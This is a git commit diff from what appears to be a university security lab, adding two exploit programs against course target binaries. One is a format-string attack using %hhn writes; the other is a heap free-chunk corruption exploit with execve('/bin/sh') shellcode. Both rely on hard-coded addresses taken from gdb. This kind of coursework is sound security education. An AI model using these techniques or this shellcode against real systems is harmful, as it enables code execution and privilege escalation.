3ca4af5dc1ffa1e83ddef47816879a77ea32b9f7
huchenlei <chenlei.hu@mail.utoronto.ca>
2018-01-20 18:09:03 -0500

    :construction: solve puzzle 6 for Lab1

--- ECE568-lab1/sploits/sploit5.c
+++ ECE568-lab1/sploits/sploit5.c
@@ -6,13 +6,67 @@
 
 #define TARGET "../targets/target5"
 
+/**
+   rip: 0x2021fe68
+   buf: 0x2021fa60
+   formatString: 0x2021f960
+ */
 int main(void)
 {
   char *args[3];
-  char *env[1];
+  char ex_str[512];
+  memset(ex_str, '\x90', 512);
+  
+  strcpy(ex_str, shellcode);
+  ex_str[strlen(ex_str)] = '\x90';
+  
+  /* 
+     0x20(32) -> 0x2021fe68
+     0x21(33) -> 0x2021fe69
+     0x60(96) -> 0x2021fe6a
+     0xfe(254) -> 0x2021fe6b
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
-  env[0] = NULL;
+     by gdb inspecting there are 5 ptrs before the first ptr in formatString
+     formatString is 256 bytes(32 8byte word)
+     
+     last addr is equivalent to 37 param in sprintf
+     
+     32;
+     33 - 32 = 1;
+     96 - 33 = 63;
+     254 - 96 = 153;
+   */
+
+  char fmt_str [] = "%32x%37$hhn %36$hhn%63x%34$hhn%153x%35$hhn";
+  memcpy(&ex_str[60], fmt_str, strlen(fmt_str));
+
+  // final 32 bytes would be return addresses
+  memcpy(&ex_str[256 - 32], "\x68\xfe\x21\x20\x00", 5);
+  
+  args[0] = TARGET;
+  args[1] = ex_str;
+  args[2] = NULL;
+
+  // Encode all '\x00' bytes in env
+  char *env[] = {
+    "\x00",
+    "\x00",
+    "\x00",
+    "\x69\xfe\x21\x20",
+    "\x00",
+    "\x00",
+    "\x00",
+    "\x6a\xfe\x21\x20",
+    "\x00",
+    "\x00",
+    "\x00",
+    "\x6b\xfe\x21\x20",
+    "\x00",
+    "\x00",
+    "\x00",
+    "\x00",
+    NULL
+  };
 
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
--- ECE568-lab1/sploits/sploit6.c
+++ ECE568-lab1/sploits/sploit6.c
@@ -6,16 +6,45 @@
 
 #define TARGET "../targets/target6"
 
+/** 
+    &q: 0x104ee78
+    &p: 0x104ee28
+    // we are changing the return addr of tfree instead of foo
+    rip: 0x2021fe38
+ */
+
 int main(void)
 {
   char *args[3];
   char *env[1];
+  
+  char sp_str[256];
+  memset(sp_str, '\x90', 256);
+  
+  char _shell[] =
+    // byte 5: \x91 the free bit set to 1 so that left addr branch got executed
+    // change the first jump instruction's shifting (1f -> 25) so that the nops got considered
+    "\xeb\x25\x90\x90\x91\x90\x90\x90\x5e\x89"
+    "\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
+    "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
+    "\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8"
+    "\xdc\xff\xff\xff/bin/sh\x00";
+  
+  memcpy(sp_str, _shell, strlen(_shell));
+  
+  /* leftward chunk addr */
+  memcpy(&sp_str[72], "\x28\xee\x04\x01", 4);
+  /* rightward chunk addr */
+  memcpy(&sp_str[76], "\x80\xee\x04\x01", 4);
+  memcpy(&sp_str[92], "\x39\xfe\x21\x20", 4); // after clearing the free bit to 0, the addr become the same as tfree's return addr
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  args[0] = TARGET; args[1] = sp_str; args[2] = NULL;
   env[0] = NULL;
-
+  
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
 
   return 0;
 }
+
+
